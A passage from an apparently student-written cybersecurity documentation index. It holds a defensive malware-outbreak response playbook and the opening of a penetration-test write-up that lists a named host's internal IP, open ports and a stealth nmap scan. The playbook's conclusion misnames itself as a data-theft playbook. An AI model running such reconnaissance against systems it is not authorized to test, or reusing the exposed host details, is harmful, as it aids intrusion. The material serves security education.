logs, examining network traffic, and conducting vulnerability assessments using tools such as Nessus or OpenVAS.Use network monitoring tools to analyze unusual traffic patterns: Network monitoring tools like Wireshark or Snort can help in detecting and analyzing unusual traffic patterns associated with the worm's activity. By monitoring network traffic in real-time, administrators can identify suspicious behavior and take appropriate action to mitigate the threat.Employ antivirus or antimalware software to detect and remove worm infections: Antivirus or antimalware software such as Norton, McAfee, or Malwarebytes can be deployed to detect and remove worm infections from infected systems. It's important to ensure that antivirus definitions are up-to-date to effectively identify and quarantine malicious files associated with the worm.Apply security patches and updates to vulnerable systems: Patch management is crucial for addressing security vulnerabilities exploited by the worm. Administrators should promptly apply security patches and updates to vulnerable systems to prevent future infections. Patch management tools such as Microsoft SCCM or WSUS can automate the patching process and ensure that systems are adequately protected against known vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#23-tools-and-techniques","content":" Network traffic analysis tools like Wireshark or Snort:Wireshark is a widely used network protocol analyzer that allows administrators to capture and interactively browse the traffic running on a computer network. Snort is an open-source network intrusion detection system (NIDS) and network intrusion prevention system (NIPS) that can monitor network traffic for suspicious activity and take action to block or alert on potential threats.Antivirus software such as Norton, McAfee, or Malwarebytes: Antivirus software plays a crucial role in detecting and removing malware infections, including worms. Norton, McAfee, and Malwarebytes are popular antivirus solutions that offer real-time protection against a wide range of threats, including worms, viruses, and Trojans.Patch management tools to apply security updates promptly: Patch management tools automate the process of applying security patches and updates to vulnerable systems, ensuring that they are protected against known vulnerabilities. Microsoft SCCM (System Center Configuration Manager) and WSUS (Windows Server Update Services) are commonly used patch management solutions for Windows environments, while tools like Red Hat Satellite are available for managing patches in Linux environments.  ","version":"Next","tagName":"h3"},{"title":"3. Trojans​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#3-trojans","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#31-objective","content":" Identify and remove Trojan malware, close backdoors, and strengthen security measures to prevent future intrusions.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#32-steps","content":" Identify suspicious processes or applications running on infected systems: Identifying Trojan malware often involves monitoring system processes and applications for any suspicious behavior. Task Manager or similar tools can be used to identify processes consuming high CPU or memory resources, which may indicate the presence of a Trojan. Additionally, security information and event management (SIEM) solutions can help in correlating system events to pinpoint potential malicious activity.Investigate changes made to files and system settings by the Trojan: Trojans typically make changes to files, registry settings, or system configurations to maintain persistence and facilitate unauthorized access. File integrity monitoring (FIM) tools can be employed to detect any unauthorized modifications to critical system files or configurations. By analyzing these changes, administrators can identify the extent of the infection and take appropriate remediation measures.Use intrusion detection systems to monitor and block unauthorized access attempts: Intrusion detection systems (IDS) play a crucial role in detecting and preventing unauthorized access attempts by Trojans or other malicious actors. IDS solutions like Snort or Suricata can analyze network traffic in real-time to identify suspicious patterns or anomalies indicative of a Trojan infection. By configuring appropriate rules and alerts, administrators can block malicious traffic and prevent further infiltration.Remove Trojan payloads and associated files: Once the Trojan malware is identified, it's essential to remove its payloads and associated files from infected systems. Antivirus or antimalware software can be used to scan and quarantine malicious files, ensuring that the Trojan is effectively neutralized. Additionally, manual inspection and removal of suspicious files and registry entries may be necessary to eradicate the infection completely.Educate users about safe browsing and downloading practices: User awareness and education are critical components of any effective cybersecurity strategy. Training programs should educate users about the risks associated with downloading files from unknown sources, clicking on suspicious links, or opening email attachments from unfamiliar senders. By promoting safe browsing habits and encouraging vigilance, organizations can mitigate the risk of Trojan infections resulting from social engineering attacks.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#33-tools-and-techniques","content":" Intrusion Detection Systems (IDS) like Snort or Suricata:IDS solutions monitor network traffic for signs of malicious activity, including unauthorized access attempts and suspicious behavior indicative of Trojan infections. Snort and Suricata are open-source IDS platforms that use signature-based detection, anomaly detection, and protocol analysis to identify and block potential threats in real-time.Endpoint detection and response (EDR) tools such as CrowdStrike or Carbon Black: EDR solutions provide advanced threat detection and response capabilities at the endpoint level, allowing administrators to detect and remediate Trojan infections across their network. CrowdStrike and Carbon Black are leading EDR platforms that offer continuous monitoring, threat hunting, and automated response features to protect against sophisticated threats like Trojans.User training and awareness programs to prevent social engineering attacks: User training programs should educate employees about the tactics used by cybercriminals to distribute Trojan malware, such as phishing emails, malicious websites, or fake software downloads. By raising awareness about these threats and providing guidance on how to recognize and avoid them, organizations can empower users to play an active role in preventing Trojan infections and other cybersecurity incidents.  ","version":"Next","tagName":"h3"},{"title":"4. Ransomware​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#4-ransomware","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#41-objective","content":" Decrypt files if possible, remove ransomware, restore affected systems from backups, and implement security measures to prevent future attacks.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#42-steps","content":" Disconnect infected systems from the network to prevent further encryption: It's crucial to isolate infected systems from the network to prevent the ransomware from spreading to other devices or encrypting additional files. This can help contain the impact of the attack and prevent further damage to data and systems.Identify the type of ransomware and check for available decryption tools: Identifying the specific type of ransomware infecting the systems is essential for determining if there are any decryption tools available. Websites like NoMoreRansom provide resources and decryption tools for various ransomware strains. Researching the ransomware variant can help in finding decryption keys or tools that may assist in recovering encrypted files without paying the ransom.Restore affected files from backups if available: If backups are available and unaffected by the ransomware attack, restoring files from backup is the most effective way to recover encrypted data. Backup and recovery solutions such as Veeam or Acronis can automate the restoration process, ensuring that critical data is quickly recovered without paying the ransom.Remove ransomware from infected systems: After disconnecting the infected systems and restoring files from backups, it's essential to remove the ransomware from the affected systems to prevent further damage. Antivirus or antimalware software can be used to scan and remove ransomware infections from infected devices, ensuring that the systems are clean and secure.Enhance security with robust backup solutions, endpoint protection, and user training: To prevent future ransomware attacks, it's essential to implement robust security measures across the organization. This includes investing in comprehensive backup solutions that regularly backup critical data to secure locations, endpoint security solutions with ransomware protection features that can detect and block ransomware attacks in real-time, and user training programs to educate employees about the risks of ransomware and best practices for avoiding infection.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#43-tools-and-techniques","content":" Ransomware decryption tools like NoMoreRansom: NoMoreRansom is a collaborative initiative between law enforcement agencies and cybersecurity organizations that provides resources and decryption tools for various ransomware strains. These tools can help victims recover encrypted files without paying the ransom, mitigating the financial impact of the attack.Backup and recovery solutions such as Veeam or Acronis: Backup and recovery solutions are essential for protecting against ransomware attacks by ensuring that critical data is regularly backed up and can be quickly restored in the event of an attack. Veeam and Acronis are leading providers of backup solutions that offer features such as automated backups, data deduplication, and encryption to safeguard against data loss and ransomware attacks.Endpoint security solutions with ransomware protection features: Endpoint security solutions play a critical role in protecting devices from ransomware attacks by detecting and blocking malicious activity in real-time. These solutions often include features such as behavior monitoring, file reputation analysis, and ransomware-specific detection algorithms to identify and mitigate ransomware threats before they can cause damage.  ","version":"Next","tagName":"h3"},{"title":"5. Botnet​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#5-botnet","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#51-objective","content":" Disrupt communication between compromised devices and command-and-control servers, remove botnet malware, and strengthen network defenses.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#52-steps","content":" Identify compromised devices communicating with command-and-control servers: Detecting compromised devices communicating with botnet command-and-control (C&amp;C) servers is crucial for mitigating botnet activity. Network monitoring tools and intrusion detection systems (IDS) can help identify suspicious network traffic patterns indicative of botnet communications.Block communication channels between infected devices and the botnet's infrastructure: Once compromised devices are identified, it's essential to block communication channels between these devices and the botnet's infrastructure. Network security appliances like firewalls and intrusion prevention systems (IPS) can be configured to block traffic to and from known botnet C&amp;C servers, effectively disrupting the botnet's operations.Use antivirus or antimalware software to remove botnet malware: Removing botnet malware from infected devices is crucial for restoring their integrity and preventing further participation in the botnet. Antivirus or antimalware software can scan and remove botnet-related files and processes from compromised devices, ensuring that they are clean and secure.Implement network segmentation and access controls to contain the botnet: Implementing network segmentation and access controls can help contain the spread of the botnet within the network. By dividing the network into smaller, isolated segments and restricting communication between them, organizations can prevent the lateral movement of botnet infections and limit their impact on critical systems and data.Monitor network traffic for signs of further botnet activity: Continuous monitoring of network traffic is essential for detecting signs of further botnet activity and preventing reinfection. Network security solutions like IDS and Security Information and Event Management (SIEM) systems can provide real-time visibility into network activity, allowing administrators to identify and respond to botnet-related threats promptly.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#53-tools-and-techniques","content":" Network security appliances like firewalls and intrusion prevention systems (IPS): Firewalls and IPS play a critical role in blocking malicious network traffic associated with botnet communication. These appliances can be configured to inspect incoming and outgoing traffic, block connections to known botnet C&amp;C servers, and prevent unauthorized access to sensitive network resources.Endpoint security solutions with botnet detection capabilities: Endpoint security solutions equipped with botnet detection capabilities can help identify and remove botnet malware from infected devices. These solutions use advanced detection algorithms and behavioral analysis techniques to detect and mitigate botnet-related threats, protecting endpoints from compromise.Threat intelligence feeds to identify known botnet command-and-control servers: Threat intelligence feeds provide valuable information about known botnet C&amp;C servers and malicious IP addresses. By subscribing to threat intelligence feeds and integrating them into security solutions, organizations can proactively block connections to known botnet infrastructure and reduce the risk of botnet infections.  ","version":"Next","tagName":"h3"},{"title":"6. Spyware​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#6-spyware","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#61-objective","content":" Detect and remove spyware, mitigate data exposure risks, and educate users on safe online behavior.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#62-steps","content":" Identify symptoms of spyware infection, such as browser redirects or pop-up ads: Recognizing common symptoms of spyware infection is the first step in detecting and mitigating its impact. Symptoms may include unexpected browser behavior such as frequent redirects to unfamiliar websites, the appearance of intrusive pop-up ads, or changes to browser settings without user consent.Scan systems with antivirus or antimalware software to detect and remove spyware: Conducting regular scans of systems with antivirus or antimalware software is essential for detecting and removing spyware infections. These tools utilize signature-based detection and heuristic analysis to identify malicious software, including spyware, and remove it from infected systems.Reset browser settings to default and remove unwanted extensions: Spyware often infiltrates systems through malicious browser extensions or changes to browser settings. Resetting browser settings to their default configurations and removing any unwanted or suspicious extensions can help eliminate spyware-related components and restore browser security and performance.Educate users about the risks of downloading suspicious software or clicking on unknown links: User education is critical for preventing spyware infections and promoting safe online behavior. Training programs should educate users about the risks associated with downloading software from untrusted sources, clicking on unknown links in emails or social media posts, and engaging in other risky online activities that may expose them to spyware threats.Implement web filtering and endpoint protection solutions to block spyware downloads: Implementing web filtering and endpoint protection solutions can help block access to malicious websites known for distributing spyware and other types of malware. Web filtering solutions can restrict access to websites based on predefined categories or URLs associated with known spyware distribution networks, while endpoint protection solutions can detect and block spyware downloads in real-time.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#63-tools-and-techniques","content":" Antispyware software like Spybot Search &amp; Destroy or Malwarebytes:Dedicated antispyware software such as Spybot Search &amp; Destroy or Malwarebytes can be used to scan and remove spyware infections from infected systems. These tools employ advanced detection algorithms and malware removal capabilities to identify and eliminate spyware-related threats, protecting users' privacy and sensitive information.Browser security extensions to block malicious websites: Browser security extensions like uBlock Origin or Bitdefender TrafficLight can help block access to malicious websites known for distributing spyware and other types of malware. These extensions use blacklist-based filtering and heuristic analysis to identify and block potentially harmful web content, providing an additional layer of protection against spyware threats.User training and awareness programs on recognizing and avoiding spyware threats: User training and awareness programs should educate users about the signs of spyware infection, such as unusual browser behavior or unexpected pop-up ads, and provide guidance on how to avoid spyware threats. Training materials may include information on safe browsing practices, the importance of keeping software up-to-date, and how to recognize and avoid common spyware distribution methods.  ","version":"Next","tagName":"h3"},{"title":"7. Adware​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#7-adware","content":"   ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#71-objective","content":" Remove adware from infected systems, block unwanted advertisements, and enhance browser security.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#72-steps","content":" Identify adware symptoms such as intrusive pop-up ads or browser redirects: Recognizing symptoms associated with adware infections is crucial for effectively removing adware from infected systems. Symptoms may include the sudden appearance of intrusive pop-up ads, browser redirects to unfamiliar websites, or changes to browser settings without user consent.Scan systems with adware removal tools to detect and remove adware: Conducting thorough scans of systems with dedicated adware removal tools is essential for detecting and removing adware infections. Tools like AdwCleaner or Bitdefender Adware Removal Tool use signature-based detection and heuristic analysis to identify and eliminate adware-related components from infected systems, restoring browser security and performance.Reset browser settings to remove unwanted extensions and restore default configurations: Adware often infiltrates systems through malicious browser extensions or changes to browser settings. Resetting browser settings to their default configurations and removing any unwanted or suspicious extensions can help eliminate adware-related components and restore browser security and functionality.Install ad blockers or browser security extensions to prevent adware from displaying ads: Installing ad blockers or browser security extensions can help prevent adware from displaying unwanted advertisements and further compromising system security. Ad blocking extensions like uBlock Origin or AdBlock Plus can effectively block intrusive ads and prevent adware from displaying advertisements while browsing the internet.Educate users on safe browsing habits and avoiding suspicious downloads: User education is essential for preventing adware infections and promoting safe browsing habits. Training programs should educate users about the risks associated with downloading software from untrusted sources, clicking on suspicious links or ads, and engaging in other risky online activities that may expose them to adware threats.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#73-tools-and-techniques","content":" Adware removal tools like AdwCleaner or Bitdefender Adware Removal Tool:Dedicated adware removal tools such as AdwCleaner or Bitdefender Adware Removal Tool can be used to scan and remove adware infections from infected systems. These tools employ advanced detection algorithms and malware removal capabilities to identify and eliminate adware-related components, restoring browser security and functionality.Ad blocking browser extensions such as uBlock Origin or AdBlock Plus:Ad blocking browser extensions like uBlock Origin or AdBlock Plus can effectively block intrusive ads and prevent adware from displaying advertisements while browsing the internet. These extensions use blacklist-based filtering and heuristic analysis to identify and block potentially harmful web content, providing users with an additional layer of protection against adware threats.Browser security settings to block pop-up ads and disable automatic downloads: Configuring browser security settings to block pop-up ads and disable automatic downloads can help prevent adware from compromising system security. Users should adjust browser settings to block pop-up windows, disable automatic downloads of files or software updates, and enable built-in security features like Safe Browsing to protect against adware threats while browsing the internet.  ","version":"Next","tagName":"h3"},{"title":"8. Phishing Attack​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#8-phishing-attack","content":"   ","version":"Next","tagName":"h2"},{"title":"8.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#81-objective","content":" Identify and mitigate phishing attempts, educate users on recognizing phishing emails, and implement email security measures to prevent future attacks.  ","version":"Next","tagName":"h3"},{"title":"8.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#82-steps","content":" Identify phishing emails by analyzing sender addresses, email content, and embedded links: Phishing emails often contain suspicious sender addresses, grammatical errors, urgent requests, or embedded links leading to malicious websites. Training users to recognize these indicators can help identify phishing attempts and avoid falling victim to them.Train users to recognize phishing attempts and report suspicious emails promptly: Educating users about the characteristics of phishing emails and providing training on how to recognize and report suspicious emails promptly is crucial for mitigating phishing attacks. Phishing simulation and training platforms like KnowBe4 or PhishMe can be used to simulate phishing attacks and train users on how to respond effectively.Implement email filtering and scanning to block phishing emails before they reach users' inboxes: Deploying email security solutions that include filtering and scanning capabilities can help block phishing emails before they reach users' inboxes. These solutions analyze email headers, content, and attachments to identify and block phishing attempts, reducing the risk of users inadvertently falling victim to them.Investigate reported phishing emails to determine if any users have fallen victim: Promptly investigating reported phishing emails is essential for determining if any users have fallen victim to phishing attempts. By analyzing email headers, sender addresses, and user interactions, administrators can identify compromised accounts and take appropriate remediation measures to prevent further damage.Enhance email authentication with techniques like SPF, DKIM, and DMARC to prevent email spoofing: Implementing email authentication protocols like SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC (Domain-based Message Authentication, Reporting, and Conformance) can help prevent email spoofing and protect against phishing attacks. These techniques verify the authenticity of email senders and prevent malicious actors from impersonating legitimate domains.  ","version":"Next","tagName":"h3"},{"title":"8.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#83-tools-and-techniques","content":" Email security solutions like Proofpoint or Mimecast for email filtering and scanning: Email security solutions such as Proofpoint or Mimecast offer advanced filtering and scanning capabilities to detect and block phishing emails before they reach users' inboxes. These solutions analyze email headers, content, and attachments for signs of phishing attempts and provide administrators with tools to manage and mitigate email security risks.Phishing simulation and training platforms such as KnowBe4 or PhishMe:Phishing simulation and training platforms like KnowBe4 or PhishMe allow organizations to simulate phishing attacks and train users on how to recognize and respond to phishing attempts effectively. These platforms provide customizable phishing templates, interactive training modules, and reporting tools to help organizations strengthen their security awareness and resilience against phishing attacks.Email authentication protocols (SPF, DKIM, DMARC) to prevent email spoofing: Implementing email authentication protocols such as SPF, DKIM, and DMARC can help prevent email spoofing and protect against phishing attacks. SPF verifies that the sending mail server is authorized to send email on behalf of a domain, DKIM adds a digital signature to email messages to verify their authenticity, and DMARC provides policies for handling emails that fail authentication checks, reducing the risk of phishing attacks targeting domain impersonation.  ","version":"Next","tagName":"h3"},{"title":"9. Distributed Denial of Service (DDoS) Attacks​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#9-distributed-denial-of-service-ddos-attacks","content":"   ","version":"Next","tagName":"h2"},{"title":"9.1 Objective:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#91-objective","content":" Mitigate the impact of DDoS attacks, maintain service availability, and implement proactive measures to prevent future attacks.  ","version":"Next","tagName":"h3"},{"title":"9.2 Steps:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#92-steps","content":" Identify the source and type of DDoS attack (e.g., volumetric, protocol-based, application layer): Understanding the type and source of a DDoS attack is crucial for effectively mitigating its impact. Volumetric attacks flood network bandwidth, while protocol-based attacks target network infrastructure, and application layer attacks exploit vulnerabilities in web applications. Identifying the specific characteristics of the attack enables responders to deploy appropriate countermeasures.Redirect traffic through DDoS mitigation services or scrubbing centers to filter out malicious traffic: DDoS mitigation services and scrubbing centers provide dedicated infrastructure for filtering out malicious traffic and mitigating the impact of DDoS attacks. By redirecting traffic through these services, organizations can identify and block DDoS attack traffic while allowing legitimate traffic to reach its intended destination, thereby maintaining service availability.Implement rate limiting and access controls to mitigate the impact of DDoS attacks on critical resources: Rate limiting and access controls can help mitigate the impact of DDoS attacks on critical resources by limiting the amount of traffic allowed to access these resources. By imposing rate limits on incoming requests and implementing access controls to restrict access to vulnerable services, organizations can minimize the impact of DDoS attacks and ensure the availability of essential services.Monitor network traffic and server performance to detect and respond to DDoS attacks in real-time: Real-time monitoring of network traffic and server performance is essential for detecting and responding to DDoS attacks promptly. Intrusion detection and prevention systems (IDPS) can analyze network traffic patterns and identify signs of a DDoS attack, triggering automated response mechanisms to mitigate the impact on affected systems.Collaborate with internet service providers (ISPs) and DDoS mitigation vendors to mitigate large-scale attacks: Collaboration with ISPs and DDoS mitigation vendors is critical for mitigating large-scale DDoS attacks that exceed the organization's capacity to handle independently. ISPs can implement traffic filtering upstream to block DDoS attack traffic before it reaches the organization's network, while DDoS mitigation vendors can provide additional resources and expertise to mitigate the attack effectively.  ","version":"Next","tagName":"h3"},{"title":"9.3 Tools and Techniques:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#93-tools-and-techniques","content":" DDoS mitigation services and appliances like Cloudflare or Akamai:DDoS mitigation services and appliances such as Cloudflare or Akamai offer dedicated infrastructure and services for mitigating the impact of DDoS attacks. These services leverage advanced traffic filtering and mitigation techniques to identify and block malicious traffic, ensuring the availability of critical services during DDoS attacks.Intrusion detection and prevention systems (IDPS) to detect and block DDoS attack traffic: Intrusion detection and prevention systems (IDPS) can detect and block DDoS attack traffic by analyzing network traffic patterns and identifying signs of malicious activity. These systems can automatically trigger response mechanisms to mitigate the impact of DDoS attacks on affected systems, helping maintain service availability.Traffic analysis tools like Arbor Networks or Radware to monitor network traffic patterns: Traffic analysis tools like Arbor Networks or Radware provide real-time visibility into network traffic patterns, allowing organizations to monitor for signs of a DDoS attack. By analyzing network traffic in real-time, organizations can detect and respond to DDoS attacks promptly, minimizing disruption to business operations.  ","version":"Next","tagName":"h3"},{"title":"10. Conclusion:​","type":1,"pageTitle":"Malware Outbreak Incident Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Malware Outbreak Incident Response Usecase#10-conclusion","content":" In the journey towards enhancing cybersecurity resilience, the Data Theft Playbook stands as a steadfast ally, empowering Red Teams to conduct exhaustive assessments of an organization's security defenses and incident response capabilities. Through the meticulous simulation of real-world data theft scenarios, Red Teams illuminate vulnerabilities, expose gaps in defenses, and identify procedural weaknesses, enabling organizations to proactively fortify their security posture. By embracing a culture of continuous testing, collaboration, and improvement, organizations can navigate the ever-evolving threat landscape with confidence, effectively mitigating the risk of data breaches and unauthorized access, thus safeguarding sensitive information and upholding trust with stakeholders. ","version":"Next","tagName":"h2"},{"title":"PDF Files (Downloads)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/pdf","content":"Last updated by: SassafrasAU, Last updated on: '08/09/2024' Last updated by: SassafrasAU, Last updated on: '08/09/2024' PDF Files (Downloads) Incident Response Red Team Usecases Find below the documents referenced in the Usecases page. Denial of Service Incident Red Team UsecasesElevation-of-Privileges-Red-Team-UsecaseImproper-Usage-Red-Team-UsecasePhishing-Attack-Red-Team-UsecaseRoot-Access-Red-Team-UsecaseUnauthorised-Access-Red-Team-UsecaseData Theft Incident Response UsecaseMalware Outbreak Incident Response UsecaseVirus Outbreak Incident Response Usecase","keywords":"","version":"Next"},{"title":"Penetration Test of MQTT Server","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#introduction","content":" The key concepts of penetration testing and MQTT (Message Queuing Telemetry Transport) are essential in the realms of cybersecurity and real-time messaging. Penetration testing plays an important role in identifying system vulnerabilities and enhancing defenses against potential threats. On the other hand, MQTT is widely used in IoT and messaging applications to facilitate communication between clients. Tools such as Nmap, which is used for network scanning, and Wireshark, for packet analysis, are vital in assessing and ensuring the security and efficiency of these operations.  ","version":"Next","tagName":"h2"},{"title":"Penetration Test on redback.it.deakin.edu.au MQTT Server:​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#penetration-test-on-redbackitdeakineduau-mqtt-server","content":" ","version":"Next","tagName":"h2"},{"title":"Nmap to Scan redback.it.deakin.edu.au (ip address 10.137.0149)​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#nmap-to-scan-redbackitdeakineduau-ip-address-101370149","content":"   nmap to check whether the host (redback.it.deakin.edu.au with IP 10.137.0.149) is online and responding to network requests. The output indicates that the host is up with a latency of 0.032 seconds.  ","version":"Next","tagName":"h3"},{"title":"ping 10.137.0.149​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#ping-101370149","content":" Purpose:​  Check Host Availability: The ping command was used to verify whether the host at IP address 10.137.0.149 is reachable and responsive over the network. By sending ICMP (Internet Control Message Protocol) Echo Request packets, the command measures the time it takes for the host to respond, confirming its availability.    The ping test confirms that the host at 10.137.0.149 is up and responding with minimal latency and no packet loss, making it reachable for further communication or scanning tasks.  Opening the website: We can see a file upload page on the site.    ","version":"Next","tagName":"h3"},{"title":"Full Port Scan of 10.137.0.149​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#full-port-scan-of-101370149","content":"   Purpose:​  Comprehensive Port Scan: The -p- flag tells Nmap to scan all 65,535 TCP ports on the target host (10.137.0.149). This command ensures that no port is missed, providing a full overview of which ports are open, closed, or filtered.SYN Stealth Scan: Nmap uses a SYN Stealth Scan by default when running with sudo privileges. This scan sends SYN packets and waits for responses to identify open ports, without completing the TCP connection. This is a faster and stealthier method of scanning compared to a full TCP connection scan.  Key Details from the Output:​  Host Status: The host 10.137.0.149 is up with a very low latency of 0.00091s, indicating a fast response from the host. Filtered and Closed Ports: 65,020 filtered ports: These ports did not respond to the scan, likely due to firewall rules or packet filtering.492 closed ports: These ports responded with a TCP reset, meaning no service is running on these ports. Open Ports and Services: The scan found several open ports with services running on them, including: 22/tcp: SSH (Secure Shell)25/tcp: SMTP (Simple Mail Transfer Protocol)80/tcp: HTTP (HyperText Transfer Protocol)443/tcp: HTTPS (HTTP Secure)1514/tcp: Fujitsu DTCNS1883/tcp: MQTT (Message Queuing Telemetry Transport)5000/tcp: UPnP (Universal Plug and Play)5001/tcp: Commplex-link8000/tcp: HTTP-alt (Alternative HTTP Port)8080/tcp: HTTP Proxy8888/tcp: Sun Answerbook9000/tcp: CSListener9001/tcp: Tor ORPort (used for Tor network)27017/tcp: MongoDB (default port for MongoDB database)50000/tcp: IBM DB2 databaseSeveral other open ports with unknown services, such as 9047, 19120, 31010, 32010, and 55000. Port 8883/tcp: The port is filtered, meaning that network devices (such as firewalls) are blocking direct communication on this port. This suggests that secure MQTT (MQTT over TLS/SSL) is not currently accessible.  ","version":"Next","tagName":"h3"},{"title":"Operating System of the Host​","type":1,"pageTitle":"Penetration Test of MQTT Server","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/PenTestMQTT#operating-system-of-the-host","content":"   Based on the Nmap scan results, it appears that the host (IP address 10.137.0.149) is most likely running in a virtualized environment. The OS guess provided by Nmap suggests that it is either running Oracle VirtualBox (95%)or QEMU (91%) as the virtualization software. However, the exact operating system could not be identified due to insufficient open and closed port data.This means the system could be running on a guest operating system inside one of these virtual environments.  ","version":"Next","tagName":"h3"},{"title":"Nmap Command to Scan MQTT Ports (1883, 